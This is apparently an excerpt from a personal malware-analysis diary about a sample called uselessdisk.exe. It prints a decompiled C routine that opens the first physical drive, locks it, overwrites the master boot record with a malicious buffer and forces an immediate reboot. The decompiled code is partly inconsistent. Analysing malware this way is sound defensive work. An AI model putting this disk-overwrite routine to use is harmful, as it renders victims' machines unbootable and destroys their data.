# Uselessdisk

(extracted from main diary)

### uselessdisk.exe

I'm not done with it but here a summary of the important part :

```c
void k_writeToDiskShutdown(void)
{

k_createDataToWriteToDisk(&lpBuffer,&MBR_MALWARE,480);
fhandle = CreateFileA("\\\\.\\PHYSICALDRIVE0",0xc0000000,FILESHARE_CHANGE_MODIFY,0, 3,0,0);

if (fhandle == -1) {
    fhandle = 0x401159; // <- ???
    return;
  }
  DeviceIoControl(device,FSCTL_LOCK_VOLUME,0,0,0,0,&byteReturned, 0);
  WriteFile(device,&lpBuffer,512,&nbOfByteWritten,0);
  DeviceIoControl(device,0x9001c,0,0,0,0,&byteReturned,0);
  CloseHandle(device); // :D
  WinExec("shutdown -r -t 0",0);
  ExitProcess(-1); // but... why ? :)
}
```
